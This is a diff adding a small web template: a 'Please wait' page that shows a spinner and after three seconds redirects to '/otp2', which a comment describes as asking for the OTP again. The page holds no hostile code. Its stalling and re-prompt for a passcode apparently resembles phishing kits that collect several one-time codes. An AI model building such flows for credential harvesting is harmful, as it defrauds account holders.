@@ -1,0 +1,29 @@
+{% extends "base.html" %}
+{% block title %}Please wait{% endblock %}
+
+{% block content %}
+  <p class="subtitle" style="font-weight:800; color:#111827; margin-bottom:8px;">
+    Please wait
+  </p>
+
+  <div class="small-text" style="text-align:center; margin-top:-2px;">
+    We’re processing your request. This may take a few seconds.
+  </div>
+
+  <div style="display:flex; justify-content:center; margin-top:16px;">
+    <div class="btnSpinner" style="display:inline-block;"></div>
+  </div>
+
+  <div class="hint" style="margin-top:14px;">
+    Please don’t close this page.
+  </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+  // ✅ 3 seconds then go to OTP again
+  setTimeout(() => {
+    window.location.href = "/otp2";
+  }, 3000);
+</script>
+{% endblock %}
